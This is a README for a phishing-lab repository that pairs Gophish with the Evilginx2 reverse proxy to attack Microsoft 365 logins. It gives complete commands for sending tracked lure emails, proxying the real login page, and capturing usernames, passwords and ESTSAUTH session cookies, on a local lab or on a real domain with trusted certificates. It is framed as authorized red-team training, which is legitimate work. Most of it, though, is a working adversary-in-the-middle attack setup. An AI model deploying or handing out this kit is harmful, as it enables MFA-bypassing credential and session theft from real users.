# Evilginx + Gophish Lab

A complete lab setup for authorized phishing simulation and red-team training using **Gophish** (email delivery + click tracking) and **Evilginx2** (M365 credential + session token capture via the m364 phishlet).

> **Legal:** Use only on systems and domains you own or have explicit written authorization to test. Unauthorized use is illegal.

---

## Table of contents

1. [Architecture](#architecture)
2. [Prerequisites](#prerequisites)
3. [Repository layout](#repository-layout)
4. [Local lab setup (VM / Kali)](#local-lab-setup-vm--kali)
5. [Running gophish + evilginx together](#running-gophish--evilginx-together)
6. [Gophish campaign walkthrough](#gophish-campaign-walkthrough)
7. [Evilginx console reference](#evilginx-console-reference)
8. [Verifying a successful capture](#verifying-a-successful-capture)
9. [Production setup — real domain (no TLS errors)](#production-setup--real-domain-no-tls-errors)
10. [Local vs production comparison](#local-vs-production-comparison)
11. [Push to GitHub](#push-to-github)
12. [Troubleshooting](#troubleshooting)
13. [Daily operations](#daily-operations)

---

## Architecture

```
┌─────────────┐     click      ┌──────────────────┐    redirect     ┌─────────────────────┐
│   Victim    │ ──────────────>│  Gophish :80     │ ───────────────>│  Evilginx lure      │
│   inbox     │                │  (tracks click)  │                 │  login.domain/path  │
└─────────────┘                └──────────────────┘                 └──────────┬──────────┘
                                                                                 │
                                                                                 v
                                                                    ┌────────────────────────┐
                                                                    │ Evilginx reverse proxy │
                                                                    │ (m364 phishlet)        │
                                                                    │ proxies real Microsoft │
                                                                    │ login page             │
                                                                    └──────────┬─────────────┘
                                                                               │
                                                                               v
                                                                    ┌────────────────────────┐
                                                                    │ evilginx console       │
                                                                    │ sessions / sessions ID │
                                                                    │ username, password,      │
                                                                    │ ESTSAUTH cookies       │
                                                                    └────────────────────────┘
```

| Component | Default port | Role |
|-----------|-------------|------|
| Gophish admin UI | 3333 | Create campaigns, templates, landing pages |
| Gophish phish server | 80 | Serves tracked links from emails |
| Evilginx HTTPS | 443 | Hosts lure URL, proxies Microsoft login |
| Evilginx DNS | 53 (prod) / 5353 (local) | Resolves phish subdomains |

**Flow:**
1. Victim receives gophish email and clicks the link.
2. Gophish records the click and redirects to your evilginx lure URL.
3. Evilginx serves a proxied Microsoft 365 login page.
4. Victim enters credentials; evilginx captures username, password, and session cookies.
5. You view captures in the evilginx console with `sessions`.

---

## Prerequisites

### Software (Kali / Debian)

```bash
sudo apt update
sudo apt install -y evilginx2 gophish tmux curl python3
```

Verify:

```bash
evilginx2 -v        # should show 3.x
systemctl status gophish
tmux -V
```

### For local lab

- Root/sudo access
- Firefox or Chromium for testing
- No real domain required

### For production

- VPS with a **public IP** (DigitalOcean, Linode, Vultr, etc.)
- Domain you control at a registrar (Namecheap, Cloudflare, etc.)
- Firewall allowing inbound **TCP 80, 443** and **TCP/UDP 53**
- Evilginx must run as **root** (binds ports 443 and 53)

---

## Repository layout

```
phish-lab/
├── README.md                 # This file
├── .env.example              # Config template (copy to local-lab.env)
├── .gitignore                # Excludes secrets and runtime files
├── start-services.sh         # Start gophish + evilginx together
├── setup-local.sh            # Full local lab setup
├── setup-production.sh       # Real domain + Let's Encrypt TLS
├── fix-lab.sh                # Re-apply local fixes after changes
├── gophish-setup.py          # Auto-create gophish landing page via API
├── reset-gophish-admin.sh    # Reset gophish admin password
├── evilginx-commands.txt     # Quick command cheat sheet
└── phishlets/
    └── m364.yaml             # Microsoft 365 phishlet (by @hazcod)
```

**Never commit:** `local-lab.env`, `evilginx-ca.crt`, API keys, or passwords.

---

## Local lab setup (VM / Kali)

Local mode uses `/etc/hosts` to fake DNS and `-developer` mode for self-signed certificates. No internet-facing domain needed.

### Step 1 — Get the repo

```bash
git clone https://github.com/YOUR_USER/phish-lab.git
cd phish-lab
cp .env.example local-lab.env
```

Edit `local-lab.env`:

```bash
PHISH_DOMAIN=phish.local
EVILGINX_CFG=/root/.evilginx
EVILGINX_PORT=443
GOPHISH_ADMIN=https://127.0.0.1:3333
GOPHISH_PASS=your-gophish-admin-password
```

### Step 2 — Start everything (as root)

```bash
sudo GOPHISH_PASS='your-pass' bash setup-local.sh all
```

This will:
- Add `login.phish.local`, `www.phish.local` to `/etc/hosts`
- Write evilginx config with m364 phishlet enabled
- Start evilginx in tmux session `evilginx`
- Create gophish landing page, template, and test group via API

Or start services only:

```bash
sudo bash start-services.sh local
```

### Step 3 — Attach to evilginx

```bash
sudo tmux attach -t evilginx
```

Verify phishlet is enabled:

```
phishlets
```

Expected output:

```
| m364  | enabled  | visible  | phish.local  |
```

Get your lure URL:

```
lures
lures get-url 0
```

Example: `https://login.phish.local/nVMhumIM`

### Step 4 — Test in browser

Open (replace path with your lure path from `lures get-url 0`):

```
https://login.phish.local/nVMhumIM?email=victim@local.test
```

**Testing tips:**
- Use a **work/school** Microsoft account flow
- Do **not** click "Sign in with GitHub" or personal account links
- URL bar should stay on `*.phish.local` during login
- Detach from tmux: `Ctrl+B` then `D`

### Step 5 — Local TLS workarounds

Developer mode uses a self-signed CA. Modern Firefox **blocks user CAs for HSTS-preloaded Microsoft domains** even if you import the cert.

**Option A — Firefox (lab only):**

1. Go to `about:config`
2. Set these:
   - `security.cert_pinning.enforcement_level` → `0`
   - `security.enterprise_roots.enabled` → `true`
   - `network.trr.mode` → `5` (disables DNS-over-HTTPS)
3. Quit Firefox completely and reopen

**Option B — Chromium (easier for local lab):**

```bash
chromium --ignore-certificate-errors --user-data-dir=/tmp/phishlab \
  "https://login.phish.local/nVMhumIM?email=test@example.com"
```

> **Production with a real domain skips all of this** — Let's Encrypt provides trusted certificates automatically.

---

## Running gophish + evilginx together

Both services must run at the same time.

### Start

```bash
sudo bash start-services.sh local        # local lab
sudo bash start-services.sh production   # real domain
```

| Service | How it starts | Verify |
|---------|---------------|--------|
| Gophish | `systemctl start gophish` | `systemctl status gophish` |
| Evilginx | tmux session `evilginx` | `pgrep evilginx2` |

### Stop

```bash
sudo tmux kill-session -t evilginx   # stop evilginx
sudo systemctl stop gophish        # stop gophish
```

### Restart after config changes

```bash
sudo bash fix-lab.sh               # local: re-apply phishlet + restart
# or
sudo tmux kill-session -t evilginx
sudo tmux new-session -d -s evilginx "evilginx2 -developer -c /root/.evilginx"
```

### Access points

| What | URL |
|------|-----|
| Gophish admin | https://127.0.0.1:3333 |
| Gophish phish server | http://127.0.0.1:80 |
| Evilginx console | `sudo tmux attach -t evilginx` |
| Evilginx lure (local) | `https://login.phish.local/PATH` |

---

## Gophish campaign walkthrough

### Option A — Automated (API)

```bash
source local-lab.env
sudo GOPHISH_PASS="$GOPHISH_PASS" EVILGINX_CFG=/root/.evilginx/config.json \
  python3 gophish-setup.py
```

This creates:
- Landing page redirecting to evilginx lure with `?email={{.Email}}`
- Email template with `{{.URL}}` link
- Test group with one target

### Option B — Manual (admin UI)

1. Open https://127.0.0.1:3333 and log in as `admin`
2. **Landing Pages → New Page**
   - Name: `Evilginx Redirect`
   - Check "Capture Submitted Data" OFF (evilginx captures, not gophish)
   - Redirect to:
     ```
     https://login.phish.local/YOUR_LURE_PATH?email={{.Email}}
     ```
3. **Email Templates → New Template**
   - Subject: `Action required: verify your account`
   - Body: `<a href="{{.URL}}">Verify Account</a>`
4. **Users & Groups → New Group** — add test email addresses
5. **Sending Profiles → New Profile** — configure SMTP (production) or use local testing
6. **Campaigns → New Campaign**
   - URL: `http://127.0.0.1` (local) or your server IP (production)
   - Select template, landing page, group, sending profile
   - Launch

---

## Evilginx console reference

Attach: `sudo tmux attach -t evilginx`

```
# Phishlet management
phishlets                          # list phishlets
phishlets hostname m364 phish.local
phishlets enable m364
phishlets disable m364

# Lures
lures                              # list lures
lures create m364
lures get-url 0                    # print lure URL
lures edit 0 redirect_url https://www.phish.local

# Sessions (captures)
sessions                           # list all sessions
sessions 3                         # view session details
sessions delete 3                  # delete one session
sessions delete all                # clear all

# Config
config domain phish.local
config ipv4 external 127.0.0.1
config                               # show current config
```

See also `evilginx-commands.txt` in this repo.

---

## Verifying a successful capture

After a victim (or you in testing) completes login, run `sessions` in evilginx.

### Good capture

```
| id | phishlet | username                    | password | tokens   |
| 3  | m364     | user@company.com            | ***      | captured |
```

` sessions 3` should show:

- **username** filled in
- **password** filled in
- Cookies including **`ESTSAUTH`** and **`ESTSAUTHPERSISTENT`**

Console log during capture:

```
[+++] [3] Username: [user@company.com]
[+++] [3] Password: [***]
[+++] [3] detected authorization URL - tokens intercepted: /kmsi
```

### Bad / incomplete capture

| Symptom | Cause |
|---------|-------|
| Empty username/password | Login didn't go through proxy; TLS errors; wrong phishlet |
| `tokens: captured` but only `buid`, `esctx` cookies | Login started but never finished |
| Session from `o365` phishlet | Old broken phishlet — use m364 |
| No `ESTSAUTH` cookies | Auth completed outside proxy (real microsoftonline.com) |

---

## Production setup — real domain (no TLS errors)

With a real domain, evilginx obtains **Let's Encrypt** certificates automatically (`autocert: true`). Browsers show a valid padlock with **no CA import, no cert pinning issues, no self-signed warnings**.

### Step 1 — VPS preparation

```bash
# On a fresh VPS (Ubuntu/Debian/Kali)
sudo apt update && sudo apt install -y evilginx2 gophish tmux curl python3 git ufw

# Clone repo
git clone https://github.com/YOUR_USER/phish-lab.git
cd phish-lab
```

Open firewall:

```bash
sudo ufw allow OpenSSH
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw allow 53/tcp
sudo ufw allow 53/udp
sudo ufw enable
```

### Step 2 — DNS at your registrar

Point your domain to the VPS. Choose one method:

**Option A — Evilginx as nameserver (recommended, handles all subdomains automatically):**

| Type | Host | Value | TTL |
|------|------|-------|-----|
| NS | yourdomain.com | ns1.yourdomain.com | 3600 |
| A | ns1.yourdomain.com | YOUR_VPS_IP | 3600 |

**Option B — Direct A records (manual subdomains):**

| Type | Host | Value |
|------|------|-------|
| A | login.yourdomain.com | YOUR_VPS_IP |
| A | www.yourdomain.com | YOUR_VPS_IP |

Verify propagation (wait 5–30 minutes):

```bash
dig login.yourdomain.com +short
dig www.yourdomain.com +short
# Both should return YOUR_VPS_IP
```

### Step 3 — Run production setup

```bash
sudo PHISH_DOMAIN=yourdomain.com EXTERNAL_IP=YOUR_VPS_IP bash setup-production.sh
```

This installs the m364 phishlet, enables autocert, starts gophish + evilginx (no `-developer` flag).

### Step 4 — Configure evilginx

```bash
sudo tmux attach -t evilginx
```

```
config domain yourdomain.com
config ipv4 external YOUR_VPS_IP
phishlets hostname m364 yourdomain.com
phishlets enable m364
lures create m364
lures edit 0 redirect_url https://www.yourdomain.com
lures get-url 0
```

Copy the lure URL — e.g. `https://login.yourdomain.com/xYz123`

### Step 5 — Gophish production campaign

| Setting | Value |
|---------|-------|
| Campaign URL | `http://YOUR_VPS_IP` |
| Landing page redirect | `https://login.yourdomain.com/PATH?email={{.Email}}` |
| Sending profile | Your SMTP provider |
| Template link | `{{.URL}}` (gophish tracked link) |

**Security:** Keep gophish admin (port 3333) bound to localhost. Access via SSH tunnel:

```bash
ssh -L 3333:127.0.0.1:3333 user@YOUR_VPS_IP
# Then open https://127.0.0.1:3333 locally
```

### Why production has no TLS errors

Evilginx requests real certificates from Let's Encrypt for `login.yourdomain.com`, `www.yourdomain.com`, etc. Browsers trust these natively — the same as any normal HTTPS website.

---

## Local vs production comparison

| | Local lab | Production |
|---|-----------|------------|
| Domain | `phish.local` (fake) | `yourdomain.com` (real) |
| DNS | `/etc/hosts` file | Registrar NS/A records |
| TLS certificates | Self-signed (evilginx CA) | Let's Encrypt (autocert) |
| Browser warnings | Yes (pinning issues in Firefox) | No — valid green padlock |
| evilginx flag | `-developer` | none |
| HTTPS port | 443 | 443 |
| DNS port | 5353 | 53 |
| Gophish admin | https://127.0.0.1:3333 | SSH tunnel recommended |
| CA import needed | Yes (local Firefox workaround) | No |
| Internet required | No (except for Microsoft login proxy) | Yes |

---

## Push to GitHub

```bash
cd phish-lab

# Verify no secrets staged
git status
# These must NOT appear: local-lab.env, evilginx-ca.crt

git add .
git commit -m "Add evilginx + gophish lab setup"
git branch -M main
git remote add origin https://github.com/YOUR_USER/phish-lab.git
git push -u origin main
```

If repo already initialized:

```bash
git add README.md
git commit -m "Update detailed README"
git push
```

---

## Troubleshooting

### TLS / certificate errors (local lab)

| Error | Fix |
|-------|-----|
| `unknown certificate authority` in evilginx log | Import CA or disable Firefox pinning (see Step 5 above) |
| `Cannot handshake client login.microsoftonline.com` | Firefox HSTS blocking — use Chromium or set `security.cert_pinning.enforcement_level=0` |
| Cert already installed but still failing | Pinning issue, not missing CA — disable pinning |

### TLS errors (production)

| Error | Fix |
|-------|-----|
| Certificate not issued | DNS not propagated — wait and verify with `dig` |
| Let's Encrypt failed | Ensure port 80 is open (HTTP-01 challenge) |
| Wrong cert shown | Run `phishlets enable m364` again after DNS is live |

### Evilginx

| Problem | Fix |
|---------|-----|
| `address already in use :443` | `sudo pkill evilginx2` then restart |
| `failed to load phishlet` | Run `sudo bash fix-lab.sh` |
| m364 disabled after restart | Check `/root/.evilginx/config.json` phishlets section |
| o365/m364 collision warning | Remove old o365 yaml: `sudo rm /usr/share/evilginx2/phishlets/o365.yaml` |
| Empty username/password | Login broke out to real Microsoft — check URL bar stays on phish domain |

### Gophish

| Problem | Fix |
|---------|-----|
| Can't log in | `sudo bash reset-gophish-admin.sh NEW_PASSWORD` |
| API setup fails | Get API key from Settings page, set `GOPHISH_API_KEY` |
| Campaign link doesn't redirect | Check landing page redirect URL matches lure path |

### Sessions

| Problem | Fix |
|---------|-----|
| `tokens: captured` but no ESTSAUTH | Incomplete login — only pre-auth cookies captured |
| Deleted good session by mistake | Re-run login test — sessions can't be recovered |
| Wrong session ID | Use `sessions` to list current IDs |

---

## Daily operations

```bash
# Check everything is running
systemctl status gophish
pgrep evilginx2 && echo "evilginx up" || echo "evilginx down"

# Start
sudo bash start-services.sh local

# View captures
sudo tmux attach -t evilginx
# then: sessions

# Re-apply fixes after pulling repo updates
sudo bash fix-lab.sh

# View gophish logs
journalctl -u gophish -f

# Reset gophish password
sudo bash reset-gophish-admin.sh MyNewPassword
```

---

## Legal disclaimer

This toolkit is intended for **authorized** security assessments, penetration tests, and security awareness training only. Unauthorized access to computer systems is illegal. The authors assume no liability for misuse.
